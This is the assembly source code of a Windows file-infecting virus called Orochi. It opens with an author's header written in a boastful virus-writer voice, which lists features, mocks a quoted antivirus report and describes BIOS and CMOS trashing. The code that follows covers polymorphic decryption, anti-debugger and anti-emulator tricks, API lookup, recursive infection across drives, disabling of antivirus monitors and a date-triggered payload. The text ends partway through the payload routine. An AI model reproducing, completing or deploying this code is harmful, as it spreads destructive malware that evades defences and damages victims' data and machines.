   ;"HenKy ikimasu!"
   ;       (Here comes HenKy)
   ;                   -Dream Match Never Ends-

   ;                                       VER 4.30 (5420 BYTES)

   ;                                      [OROCHI YAMATANO COME BACK]
   ;=================================================================================================



   ;=================================================================================================
   ;__________________________ W32/HTM/MIRC OROCHI BY HenKy (FINAL VERSION)_________________________
   ;================================================================================================
   ;         *** NOT FOR [RE]PUBLISHING IN VX ZINES/WEB SITES IN ANY FORM, EXCEPT [MATRiX] ***
   ;Disclaimer:
   ;
   ;       The author is not responsable of any problems caused due
   ;       to assembly of this file.
   ;
   ;  WARNING: THIS IS A VIRUS, IF YOU COMPILE IT WILL DESTROY ALL YOUR DATA... ;P
   ;
   ;       THE RELEASE OF THIS SOURCE CODE IS ONLY FOR LEARNING/RESEARCHING PURPOSES,
   ;       YOU CAN FREELY MODIFY THIS SOURCE WITHOUT GIVE ANY CREDIT TO HIS AUTHOR
   ;       SIMPLY ASSUME YER LAMENESS....
   ;      BUT PLEASE....       NOT COMPILE OR RELEASE..... PLEASE........
   ;================================================================================================
   ;
   ;-AUTHOR:        HenKy H0l0kausT [MATRiX]
   ;
   ;-MAIL:          HenKy@latinmail.com
   ;-ORIGIN:        SPAIN (MARCH 2000)
   ;
   ;-TARGET:        PE EXE/SCR & HTM FILES LAST SECTION INCREASE ...
   ;-OS'S:          W32 COMPATABLE W95/98 NT4/5 & 2000 (NOT TESTED IN THE LAST OS'ES)
   ;-MULTIPARTITE   YES (PE->HTM)
   ;-RESIDENT:      YES (RING0)
   ;-STEALTH:       NO
   ;-THREADS:       NO (DUH?)
   ;-FIBERS;        NO (..)
   ;-KERNEL SEARCH: YES
   ;-ENCRYPTED:     YES (VERY ENCRYPTED: POLY + two RDA layers )
   ;-POLYMORPHIC:   YES ... LAME SLOW-POLY LAYER ... TO TIRED ... :DDDDDDDD
   ;-ANTIDEBUGGER:  YES (HYPER-ANTI-DEBUG)
   ;-ANTITRACE:     YES
   ;-ANTIEMULATOR:  YES (HYPER-ANTI-EMUL)
   ;-ANTIDISASM:    YES
   ;-ANTIHEURISTIC: YES
   ;-ANTIBAIT:      YES
   ;-ERROR HANLING: YES (SEH)
   ;-RETRO:         YES (BYE, BYE AV'S)
   ;-COMPRESSION:   NO (FUCKED LZ ALGORITHM :/
   ;-EPO:           NO
   ;-ANTIWATCHDOGS: YES (AVPM,AMON & NAV)
   ;-CHECKSUM:      NO (IN THE NEXT VERSION I WILL MEMORY-MAP THE FILES ;)
   ;
   ;-OTHERS:      IS A VERY UNSTABLE VIRUS, IT WONT INFECT NTOSKRNL.EXE IN NT AND NOT HAVE
   ;              A BIG CHANCE TO SURVIVE IN THE WILD.
   ;              HD-SCANNER... ETC... A BIT (EJEHM... )'VERY' SLOW ....
   ;-PAYLOAD:
   ;
   ;   THE 3 OF JULY IN DISPLAY A MESSAGE-BOX, THEN MAKE A GRAPH EFFECT (HI LJ'S)
   ;
   ;HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
   ;
   ;
   ;
   ;WHEN AN INFECTED FILE IS RUN:
   ;
   ;   - PUT A NEW SEH AND CAUSE ONE EXCEPTION, FOOLING APPLEVEL DEBUGGERZ AND EMULATORZ
   ;
   ;   - PROCESS HIS POLYMORPHIC DECRYPTOR

   ;   - PROCESS THE TWO RDA DECRYPTION ROUTINES

   ;   - PROCESS MANY ANTI-EMULATION TRICKS:
   ;     * STACK MANIPULATION
   ;     * SELECTORS
   ;     * FPU COMPROBATION
   ;     * SELF MODIFIED CODE (INT 01H RULES)

   ;   - ANTIDISASSEMBLER: USE SOME RANDOM DWORDS AFTER THE RET'S & JMP'S

   ;   - PUT A NEW SEH

   ;   - SEARCH THE KERNEL32 ADRESSES

   ;   - SEARCH THE GetModuleHandle API IN ET

   ;   - RETRIEVE THE NECESSARY APIS

   ;   - CHECK CPU TYPE IF NOT MMX, RETURN TO HOST

   ;   - CHECK A RANDOM VALUE IF 50% RETURN TO HOST, TO AVOID SLOWDOWN

   ;   - PROCESS ANTIDEBUGGER PART:
   ;     * IF W9.X DESTROY DEBUG REGS AND MAKE SHIT THE STACK
   ;     * IF NT, USE THE IsDebuggerPresent API

   ;   - SEARCH FILES IN WINDOWS,SYSTEM AND CURRENT DIR IF MINUTES  EQUAL TO 30 MAKE A RECURSIVE
   ;     SEARCH IN THE DRIVES C,D,E,F,G, AND H.

   ;   - INFECT FILES EXPANDING THE LAST SECTION AND MODIFING THE FUCKED ENTRYPOINT (AVP CATCH THIS)

   ;   - INFECT WEBPAGES OVERWRITING THE FIRST BYTES WITH A CODE THAT DISABLE THE ACTIVEX
   ;   PROTECTION (IM A LAMEEEERRRR!!!!!) (NOTE, ONLY IN NT)

   ;   - MODIFY MIRC.INI FOR SEND A INFECTED CALC.EXE (YES NT ONLY... LAMER,LAMER,LAMER...)
   ;     (ARGHHH! THE NT DIR ISNT C:\WINDOWS (SHIT, I'VE FOUND THE BUG WHILE WAS WRITING THIS)
   ;     (...WICH IS THE DEFAULT NT DIR?...)

   ;   - DELETE SOME AV CHECKSUMS AND DATABASES

   ;   - DISABLE SOME RESIDENT SHIELDS

   ;   - BEFORE TO RETURN TO THE HOST IF WE ARE IN W9X JUMP TO RING0 AND STAY RESIDENT
   ;     HOOKING THE OPENFILE PROCEDURE AND STABLISH A COUNTAH IF THE NUMBER OF FILES OPENED
   ;     REACH A RANDOM VALUE MAKE A BIOS & CMOS TRASHING... ALSO EVERY FILE OPENED WILL
   ;     MODIFY THE DR3 REGISTER MAKING SOME DEBUGGERS VERY STONED (TRACING OROCHI UNDER TD32
   ;     THE PROGRAM JUMP INCORRECTLY INTO THE OFFSETS AND HANG THE ENTIRE MACHINE...)

   ;   - THE PAYLOAD SUCCEDED THE THIRD OF JULY.. SHOW THE TYPICAL MESSAGE-BOX AND PUT RANDOM
   ;     BLACK SQUARE PIXELS.... INFINITE LOOP
   ;
   ;    KNOW BUGS: THE VIRUS NOT MAKE ANY CHECKSUM CALCULATION BUT IT WORK IN NT BECOZ AVOID THE
   ;    INFECTION OF THE NTOSKERNEL.EXE.....
   ;
   ;
   ;
   ;   WHO IS OROCHI ???...     PLAY KOF97.... AND YOU WILL SEE...        YOURSELF.
   ;
   ;
   ;
   ;
   ;/////////////// ThiS IS ThE MATRiX AwakeninG... THX TO TRUST IN ME :) \\\\\\\\\\\\\\\\\\\\\\\\\
   ;=================================================================================================
   ;
   ;-  Profile  -
   ;
   ;CODING STYLE         : SKYZ0FREN+LAME
   ;ORIGIN COUNTRY       : SPAIN
   ;BIRTH AGE            : 3/7/19XX
   ;BLOOD TYPE           : 0+OROCHI
   ;HIGHT/WEIGHT         : 1'86?/60?
   ;HOBBIES              : SEX/TECHNO/ASM/KOF...
   ;SPORT                : NONE ;P
   ;FOOD                 : ITALIAN FOOD?
   ;LOVE                 : ??? PAMELA ANDERSON ???
   ;HATE                 : YOU (OF COURSE)
   ;


   ;!!!!!!!!!!!!!!!!!!!!!! very important: A LOT OF THANKS TO: !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   ;
   ; T-2000, Z0MBIE, BILLY BELCEBU, LORD JULUS, GRIYO, VIRTUAL DAEMON, MR.SANDMAN, SHAITAN,
   ; ThE WiZArD, SLAGEHAMER, VIRUSBUSTER, HACKING HELL, SUPER AND TO ALL MATRiX MEMBERZ:
   ; ULTRAS,NBK,MORT,DEL_ARMG0 AND TGR.... AND TO ALL SNK GROUP , PLEASE CONTINUE WORKING! :P
   ;
   ;¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡ FOR THEIR CODE AND IDEAS ¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡¡
   ;                  (SPECIAL THX TO T-2000 FOR MAKE THIS POSSIBLE)


   ;
   ;
   ;                       N0W IS ThE TimE....
   ;                                             AnD AT ThE TimE....
   ;
   ;                                        HH!           http://personal.redestb.es/jonh.o.ann
   ;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,

   ;IF YOU WANT TO CRITICIZE ME: HenKy@latinmail.com (A BIG SHIT-MAIL-SERVER) I NOT READ DAILY




   ;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
   ;
   ;                                SOME SILLY AV_REPORTS
   ;.................................................................................................
   ;
   ;- Virus Incident Report - [ABOUT THE BETA VERSION (3.1)]
   ;
   ;Oxygen3 24h-365d, by Panda Software
   ;Last menace for this week is W23/Orochi.3982,[W23 WHAT???] a virus that affects
   ;computers with Windows 98 and Windows NT. Its size is 3982 bytes and is
   ;run in computers with Intel microprocessors which are capable of
   ;interpreting MMX instructions.
   ;
   ;After carrying out the infections, it activates itself on the 3rd of
   ;July. Then it will substitute the original MBR (Master Boot Record)
   ;whose task is to delete the CMOS and flash-BIOS memory, if it exists.
   ;This is why W32/Orochi.3982 is considered to be a rather destructive
   ;virus. [YES, IT IS]
   ;
   ;W32/Orochi.3982 uses any of the usual techniques of propagation employed
   ;by the existing viruses: floppy disks, CD-ROMs, other types of storage
   ;units, working with system files in computer networks, the Internet,
   ;downloads, sending and receiving e-mail messages to which the infected
   ;file has been attached or included within the message itself,...etc.
   ;
   ;After carrying out the infection, W32/Orochi.3982 remains in the system
   ;until the date of its activation arrives. In this case it is the 3rd of
   ;July. On activating it implements all its destructive payload.
   ;
   ;· Substitution of the original MBR (Master Boot Record) by its own code
   ;that helps it to carry out all the subsequent operations.
   ;· Deletion of the CMOS memory. Eliminates all the contents of this type
   ;of memory that include, among other things, the boot and system
   ;configuration settings.
   ;· Deletion of the Flash-BIOS memory.
   ;
   ;When each of these objectives have been successfully attained, the virus
   ;leaves the infected equipment completely disabled.
   ;
   ;W32/Orochi.3982 does not infect files employing the Windows 95 Operating
   ;System due to the use of a special function, which this operating system
   ;lacks. [NOW IS FIXED]
   ;
   ;In the first place it checks to see the type of microprocessor installed
   ;in the computer. If this has the capacity to interpret MMX instructions,
   ;it continues with its task of infecting the machine, otherwise it
   ;abandons this task.
   ;
   ;The infection of files is produced when the minutes of the system reach
   ;the numeric value of 30. At that moment the virus starts working on the
   ;disk drives detected: C: D: E: F: G: and H:.
   ;
   ;After the infection has occurred, W32/Orochi.3982 is activated on the
   ;3rd of July and is highly destructive. It installs the new MBR (Master
   ;Boot Record) in the hard disk of the computer infected and deletes the
   ;contents of the CMOS and Flash BIOS memory. [SI, YA LO HAS DICHO]
   ;
   ;Moreover, it also uses techniques that allow it to remain hidden and to
   ;avoid detection by the resident protection that are used by some
   ;antivirus programs. This way it is able to disable the scans used to
   ;search for the viruses.
   ;
   ;An anecdotal detail relating to the name of this virus: W32/Orochi.3982
   ;comes from the character called Orochi who appears in a video game
   ;called King Of Fighters, from the mythical eight-headed dragon called
   ;Yamata-no-Orochi. [GOOD, GOOD THEY KNOW THE GAME!!! SURE THEY ARE PLAYING
   ;NEO-RAGE INSTEAD LEARNING ASM ;)))) ANYWAY GOOD REPORT]



   ; PLEASE, PUT ANOTHER REPORTS HERE....



   ;.................................................................................................
   ;                              THE VIRAL SOURCE BEGINS HERE:
   ;.................................................................................................

   ;Izure, mina shin unde suyo.
          ;(Sooner or later, everyone dies.)


   .586p  ;heey THIS IS REALLY GOOD!!!

   .MODEL  FLAT

   .DATA

   DB 0
                         ; 100% UPERKASE CODE........  HI T!
   .CODE

   EXTRN           ExitProcess:PROC

   Virus_Size      EQU     (Virus_End-CHRIS)

   Virus_Size_Mem  EQU     (Buffer-CHRIS)

   Rda_Size        EQU     (Rda_end-Rda_CHRIS)

   Rda2_Size       EQU     (RDA2_END-RDA2_CHRIS)

   WEB_Size        EQU     (WEB_END-WEBCODE+3)

   IRC_Size        EQU     (IRC_END-IRC_CODE+3)

   Min_Size_Infect EQU     (50*1024)

   Max_Size_Infect EQU     (50*1024*1024)

   N               EQU     0FH

   IFSMgr          EQU     0040h

   GetHeap         EQU     000Dh

   UniToBCSPath    EQU     0041h

   InstallFileSystemAPIhook  EQU     0067h

   Ring0_FileIO    EQU     0032h

   IFSFN_OPEN      EQU     36

   IFSFN_CLOSE     EQU     0Bh

   R0_WRITEFILE    EQU     0D601h


   virussize               MACRO
                           DB      Virus_Size/01000 mod 10 + "0"
                           DB      Virus_Size/00100 mod 10 + "0"
                           DB      Virus_Size/00010 mod 10 + "0"
                           DB      Virus_Size/00001 mod 10 + "0"
                           ENDM



   EXE_Header              STRUC
   EXE_Mark                DW      0
   Image_Mod_512           DW      0
   Image_512_Pages         DW      0
   Reloc_Items             DW      0
   Header_Size_Mem         DW      0
   Min_Size_Mem            DW      0
   Max_Size_Mem            DW      0
   Program_SS              DW      0
   Program_SP              DW      0
   MZ_Checksum             DW      0
   Program_IP              DW      0
   Program_CS              DW      0
   Reloc_Table             DW      0
   EXE_Header              ENDS


   PE_Header               STRUC
   PE_Mark                 DD      0
   CPU_Type                DW      0
   Number_Of_Sections      DW      0
                           DD      0
   Reserved_1              DD      0
                           DD      0
   NT_Header_Size          DW      0
   PE_Flags                DW      0
                           DD      4 DUP(0)
   EIP_RVA                 DD      0
                           DD      2 DUP(0)
   Image_Base              DD      0
   Object_Align            DD      0
   File_Align              DD      0
                           DW      0, 0
                           DW      0, 0
                           DW      0, 0
   Reserved_5              DD      0
   Image_Size              DD      0
   Headers_Size            DD      0
   PE_Checksum             DD      0
   Subsystem               DW      0
   PE_Header               ENDS



   Section_Header          STRUC
   Section_Name            DB      8 DUP(0)
   Section_Virtual_Size    DD      0
   Section_RVA             DD      0
   Section_Physical_Size   DD      0
   Section_Physical_Offset DD      0
   Section_Reserved_1      DD      0
   Section_Reserved_2      DD      0
   Section_Reserved_3      DD      0
   Section_Flags           DD      0
   Section_Header          ENDS



   Find_First_Next_Win32   STRUC
   File_Attributes         DD      0
   Creation_Time           DD      0, 0
   Last_Accessed_Time      DD      0, 0
   Last_Written_Time       DD      0, 0
   Find_File_Size_High     DD      0
   Find_File_Size_Low      DD      0
   Find_Reserved_1         DD      0
   Find_Reserved_2         DD      0
   Find_File_Name          DB      260 DUP(0)
   Find_DOS_File_Name      DB      14 DUP(0)
   Find_First_Next_Win32   ENDS

   ;Sore ga anata no unmei yo.
   ;That is
   ;         your fate.




   ;"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
   ;_________________________ ANTIEMULATOR/DEBUGGER P0LYM0RPHIC DECRYPTOR _________________________
   ;,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
   ;
   ;                    L.A.M.E. (LIGHT ANGEL MUTATION ENGINE) C0DE BY HenKy                 (uff!)
   ;
   ;()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()
   ;"Yosh." (Okay.)


   CHRIS:

                   DB     'h'

         POLY_PUSH DD     'enKy'          ;CHANGE!

                   PUSHFD

                   PUSHAD

                   CALL    ANTIDEBUG

                   MOV     ESP,[ESP+08h]

                   DB      033H

      POLY_XOR_REG DB      0D2H            ;CHANGE!

                   DB      064H

                   DB      08FH

     POLY_POP_WREG DB      02H             ;CHANGE!

      POLY_POP_REG DB      05AH            ;CHANGE!


                   CALL    Delta

   Delta:          POP     EBP

                   MOV     ECX, (Virus_End-CRYPTOTRON) / 4

                   SUB     EBP, (Delta-CHRIS)

                   PUSH    EBP


   Decrypt_DWORD:


          POLY     DW      9090H            ;CHANGE!

         BASECODE  DD      90909090H        ;CHANGE! (NOPE¡)

                   SUB     EBP,4

         POLY_LOOP DB      0E2H             ;CHANGE!

                   DB      0F5H

                   JMP     CRYPTOTRON

   ANTIDEBUG:

                   DB      033H

     POLY_XOR_REG2 DB      0D2H             ;CHANGE!

                   DB      064H

                   DB      0FFH

    POLY_PUSH_WREG DB      032H             ;CHANGE!

                   DB      064H

                   DB      089H

          POLY_MOV DB      022H             ;CHANGE!

                   DB      0FEH             ;CHANGE AT YER PLEASURE (INC,DEC,NOT,NEG...)

         POLY_TRAP DB      0AH              ;CHANGE!


   align 4


   ;|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
   ;==================================== P0LY-ENCRYPTED Z0NE  ======================================
   ;|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

   ;Kimisama no shi o motte na. (With
       ; your death.)


   CRYPTOTRON:      NOP

                   NOP

                   NOP

                   FNOP

                   POP     EBP

                   CMP     EBP,401000H

                   JE      SUMP

                   CALL    RDA  ; RE-DECRYPT SOME CODE... HEHEHE!!!

                   CALL    RDA2


   SUMP:
                   PUSHFD

                   PUSHAD

                   FILD    WORD PTR [EBP+(PING-CHRIS)]

                   FILD    WORD PTR [EBP+(NOPPER-CHRIS)]

                   FADD

                   FIST    WORD PTR [EBP+(EMULDIE-CHRIS)]

                   JMP     SALTO

   YASHIRO:


           PING    DW      9090H-1

           NOPPER  DW      0001H

           RDA_KEY DD      0

          RDA_KEY2 DD      0


   ;====================================== OTHER ENCRYPTION LAYER ===================================
   ;/////////////////////////////////////////////////////////////////////////////////////////////////
   ;"Osu!" (Karate salute.)


   RDA2_CHRIS:


             KOF   DB      "ThE TimE IS HerE "

                   DB      "Th0sE Wh0 Can'T HacK ME ArE HeadeD Fr0M A L0nG SleeP"  ; X/



                   INT 01H

                   NOP

                   CLI

                   CALL    $-1

                   A18 DD 0



   ;|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
   ;================================= F00L ALL C0DE EMULAT0RS =======================================
   ;|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||


   ;Sonomama shine! (Die as you are!)

   SALTO:
                   JMP     ANTIDEMOL

               SDF DB      '4.3'

   ANTIDEMOL:

                   MOV     ECX,66

      NATAS:

                   FNOP

           SALC    DB      0D6h ; PICK|

                   FNOP

                   FNOP

                   FNOP

                   NOP

                   LOOP    NATAS     ; KILLER LOOP

           EMULDIE DW      01CDH

                   MOV     EBX,ESP

                   PUSH    CS       ; IM ABLE TO READ YER MIND

                   POP     EAX

                   CMP     EBX,ESP

                   JNZ     YASHIRO

                   MOV     EDX, ESP

                   PUSH    CS

                   POP     EAX

                   CMP     ESP,EDX

                   JNE     YASHIRO

                   MOV     EAX,DS

                   PUSH    EAX

                   POP     DS

                   MOV     EBX, DS

                   CMP     EAX, EBX

                   JNE     YASHIRO

   REST:

                   POPAD

                   POPFD

                   JMP     REAL


   ;================================= IF N0 EMULATI0N G0! ===========================================


   ;Tsuki o miru tabi omoi dase." (You
    ;        will recall this event whenever you see the moon.)

             PADF  DB     'HI HackeR, HenKy LiveS HerE' ;8-DDDD
   RDA2_END:

   REAL:

                   MOV     WORD PTR [EBP+(EMULDIE-CHRIS)], 01CDH

                   MOV     EAX, EBP

                   SUB     EAX, 1000h

   Base_Displ      equ     DWORD PTR $-4



                   LEA     EBX, [EAX+(Virus_Size_Mem+1000h)]

   Old_EIP_RVA     EQU     DWORD PTR $-4



                   MOV     [ESP+(9*4)], EBX

                   CALL    Setup_SEH

                   MOV     ESP, [ESP+(2*4)]

                   JMP     FUERA

                   A17 DD 0



   ;===================================== PUT AN0THER SEH ===========================================



   Setup_SEH:      XOR     EDX,EDX

                   PUSH    DWORD PTR FS:[EDX]

                   MOV     FS:[EDX], ESP

                   CLD

                   MOV     EAX, [ESP+(12*4)]

                   XOR     AX, AX

                   MOV     BYTE PTR [EBP+(FLAGELO-CHRIS)],0



   ;==================================== FIND KERNEL ADRESSES =====================================



   Find_K32_Base:  CMP     EAX, 400000h

                   JB      JMP_FUERA

                   CMP     EAX, 0BFF70000H

                   JNE     FLAGO

                   MOV     BYTE PTR [EBP+(FLAGELO-CHRIS)],1

       FLAGO:

                   CMP     BYTE PTR [EAX], 4DH ; ANTIHEURISTIC: CHECK FOR 'M'Z

                   JNE     PABAJO

                   CMP     [EAX.Reloc_Table], 40H

                   JB      PABAJO

                   MOV     EBX, [EAX+3Ch]

                   ADD     EBX, EAX

                   CMP     BYTE PTR [EBX], 50H  ; ANTIHEURISTIC: CHECK FOR 'P'E

                   JNE     PABAJO

                   MOV     EBX, [EBX+120]

                   ADD     EBX, EAX

                   MOV     ESI, [EBX+(3*4)]

                   ADD     ESI, EAX

                   PUSH    EAX

                   LODSD

                   CALL    UPKASE

                   XCHG    ECX, EAX

                   LODSD

                   CALL    UPKASE

                   CMP     EAX, '23LE'

                   POP     EAX

                   JNE     PABAJO

                   CMP     ECX, 'NREK'

                   JE      Found_K32_Base



   PABAJO:

                   SUB     EAX, 65536

                   JMP     Find_K32_Base

   JMP_FUERA:      JMP     FUERA

                   A16 DD 0



   Found_K32_Base: MOV     EDX, [EBX+(8*4)]

                   ADD     EDX, EAX

                   MOV     ECX, [EBX+(6*4)]

                   DEC     ECX



   ;=================================== GET GETPROCADRESS ==========================================



   Find_GPA:       MOV     EDI, [EDX+(ECX*4)]

                   ADD     EDI, EAX

                   PUSHAD

                   LEA     ESI, [EBP+(GetProcAddress_Name-CHRIS)]

                   PUSH    15

                   POP     ECX

                   REPE    CMPSB

                   POPAD

                   JNE     LOOP_Find_GPA

                   MOV     ESI, [EBX+(9*4)]

                   ADD     ESI, EAX

                   MOVZX   ESI, WORD PTR [ESI+(ECX*2)]

                   MOV     EBX, [EBX+(7*4)]

                   ADD     EBX, EAX

                   LEA     EBX, [EBX+(ESI*4)]

                   MOV     ESI, [EBX]

                   ADD     ESI, EAX

                   MOV     [EBP+(GetProcAddress-CHRIS)], ESI



   LOOP_Find_GPA:  LOOP    Find_GPA

                   XCHG    EBX, EAX

                   LEA     ESI, [EBP+(API_Names-CHRIS)]

                   LEA     EDI, [EBP+(API_Addresses-CHRIS)]



   ;===================================== GET ALL APIS ==============================================



   Loop_Get_API:   PUSH    ESI

                   PUSH    EBX

                   CALL    [EBP+(GetProcAddress-CHRIS)]

                   CLD

                   STOSD

                   XCHG    ECX, EAX



   Find_Next_API:  LODSB

                   OR      AL, AL

                   JNZ     Find_Next_API

                   CMP     [ESI], AL

                   JNZ     Loop_Get_API

                   PUSHAD

                   XOR     EAX,EAX

                   INC     EAX

                   CPUID

                   BT      EDX,17H

                   POPAD

                   JNC     FUERA

                   CMP     EBP,401000H

                   JE      ANTITEL

                   CALL    RANDOM

                   CMP     EAX,99999999H

                   JB      FUERA



   ;¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬

   ;====================================== ANTIDEBUGGER PART :) ===================================

   ;¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬¬



   ;Akuwa yurusan!" (Evil is

   ;       unforgivable!)



   ANTITEL:

                   CMP     BYTE PTR [EBP+(FLAGELO-CHRIS)],1

                   JE      NOPE

                   CALL    [EBP+(IsDebuggerPresent-CHRIS)] ;NT/2000 WILL DIE TOO

                   XCHG    EAX, ECX

                   JECXZ   ZEARCH

                   JMP     PAYLOAD

                   A15 DD 0

   NOPE:

                   CALL    APPLEVEL



   ;====================================== SEARCH FILES ==========================================



           ;"Ikuzou!" (Let's go!)



   ZEARCH:

                   LEA     ESI, [EBP+(Current_Directory-CHRIS)]

                   MOV     EBX, 260

                   PUSH    ESI

                   PUSH    ESI

                   PUSH    EBX

                   CALL    [EBP+(GetCurrentDirectoryA-CHRIS)]

                   ADD     ESI, EBX

                   PUSH    ESI

                   PUSH    EBX

                   PUSH    ESI

                   CALL    [EBP+(GetWindowsDirectoryA-CHRIS)]

                   ADD     ESI, EBX

                   PUSH    ESI

                   PUSH    EBX

                   PUSH    ESI

                   CALL    [EBP+(GetSystemDirectoryA-CHRIS)]

                   CALL    [EBP+(SetCurrentDirectoryA-CHRIS)]

                   CALL    TRASH_DIR

                   CALL    [EBP+(SetCurrentDirectoryA-CHRIS)]

                   CALL    TRASH_DIR

                   CALL    [EBP+(SetCurrentDirectoryA-CHRIS)]

                   CALL    TRASH_DIR

                   LEA     EAX,[EBP+(SYSTEMTIME-CHRIS)]

                   PUSH    EAX

                   CALL    [EBP+(GetSystemTime-CHRIS)]

                   CMP     WORD PTR [EBP+(ST_wMinute-CHRIS)],30d

                   JNE     FGDI32

                   LEA     EDX, [EBP+(drive_c-CHRIS)]

                   CALL    REKURSIVITY

                   LEA     EDX,[EBP+(drive_d-CHRIS)]

                   CALL    REKURSIVITY

                   LEA     EDX, [EBP+(drive_e-CHRIS)]

                   CALL    REKURSIVITY

                   LEA     EDX,[EBP+(drive_f-CHRIS)]

                   CALL    REKURSIVITY

                   LEA     EDX, [EBP+(drive_g-CHRIS)]

                   CALL    REKURSIVITY

                   LEA     EDX, [EBP+(drive_h-CHRIS)]

                   CALL    REKURSIVITY



   ;======================================= GDI32 APIS ==========================================



   FGDI32:

                   LEA     EAX, [EBP+(GDI32_Name-CHRIS)]

                   PUSH    EAX

                   CALL    [EBP+(GetModuleHandleA-CHRIS)]

                   MOV     DWORD PTR [EBP+(GDI32-CHRIS)],EAX



   ;======================================= USER32 APIS ==========================================



   FUSER32:

                   LEA     EAX, [EBP+(USER32_Name-CHRIS)]

                   PUSH    EAX

                   CALL    [EBP+(GetModuleHandleA-CHRIS)]

                   XCHG    ECX, EAX

                   JECXZ   EXIT_YA

                   MOV     DWORD PTR [EBP+(USER32-CHRIS)],ECX


   ;=================================== PAYLOAD CHECKING ========================================

   PAYLOAD:

                   LEA     EAX, [EBP+(FindWindowA_Name-CHRIS)]

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(USER32-CHRIS)]

                   CALL    [EBP+(GetProcAddress-CHRIS)]

                   OR      EAX, EAX

                   JZ      FUERA

                   MOV     DWORD PTR [EBP+(FindWindowA-CHRIS)], EAX

                   LEA     EAX, [EBP+(PostMessageA_Name-CHRIS)]

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(USER32-CHRIS)]

                   CALL    [EBP+(GetProcAddress-CHRIS)]

                   OR      EAX, EAX

                   JZ      FUERA

                   MOV     DWORD PTR [EBP+(PostMessageA-CHRIS)], EAX



   ;================================== KILL MONITORS =============================================



                   CALL    KILL_MONITORS



   ;=================================== PAYLOAD CHECK ============================================



                   LEA     EAX,[EBP+(SYSTEMTIME-CHRIS)]

                   PUSH    EAX

                   CALL    [EBP+(GetSystemTime-CHRIS)]

                   CMP     WORD PTR [EBP+(ST_wMonth-CHRIS)],07d

                   JNE     FUERA

                   CMP     WORD PTR [EBP+(ST_wDay-CHRIS)],03d

                   JE      PAYLOADER

    EXIT_YA:       JMP     FUERA

                   A14 DD 0



   ;==================================== PAYLOAD ================================================

   ;///////////////////////////// THE OROCHI BLOOD RIOTS! \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   ;=============================================================================================





   PAYLOADER:

                   LEA     EAX, [EBP+(MessageBoxA_Name-CHRIS)]

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(USER32-CHRIS)]

                   CALL    [EBP+(GetProcAddress-CHRIS)]

                   OR      EAX, EAX

                   JZ      FUERA

                   XCHG    EBX,EAX



   MESSAGE:        PUSH    01h

                   LEA     EAX, [EBP+(HTITLE-CHRIS)]

                   PUSH    EAX

                   LEA     EAX, [EBP+(HTEXT-CHRIS)]

                   PUSH    EAX

                   PUSH    0

                   CALL    EBX

                   DEC     EAX

                   DEC     EAX

                   JZ      FUERA



   GRAPHIXX:


                   LEA     EAX, [EBP+(GetDC_Name-CHRIS)]

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(USER32-CHRIS)]

                   CALL    [EBP+(GetProcAddress-CHRIS)]

                   OR      EAX, EAX

                   JZ      FUERA

                   MOV     [EBP+(GetDC-CHRIS)],EAX

                   LEA     EAX, [EBP+(BitBlt_Name-CHRIS)]

                   PUSH    EAX

                   PUSH    DWORD PTR [EBP+(GDI32-CHRIS)]

                   CALL    [EBP+(GetProcAddress-CHRIS)]

                   OR      EAX, EAX

                   JZ      FUERA

                   MOV     [EBP+(BitBlt-CHRIS)],EAX

                   XOR     EAX, EAX

                   PUSH    EAX

                   CALL    [EBP+(GetDC-CHRIS)]

                   MOV     [EBP+(screen-CHRIS)], EAX



   loop_:

                   MOV     EAX,2000

                   CALL    brandom32 ;JULUUUUUUUUUUUUUS :)

                   MOV     [EBP+(x-CHRIS)], EAX

                   MOV     EAX,2000

                   CALL    brandom32

                   MOV     [EBP+(y-CHRIS)], EAX

                   PUSH    0

                   PUSH    DWORD PTR [EBP+(x-CHRIS)]

                   PUSH    DWORD PTR [EBP+(y-CHRIS)]

                   PUSH    DWORD PTR [EBP+(screen-CHRIS)]

                   PUSH    5
                                     ; THX MYLORD
                   PUSH    5

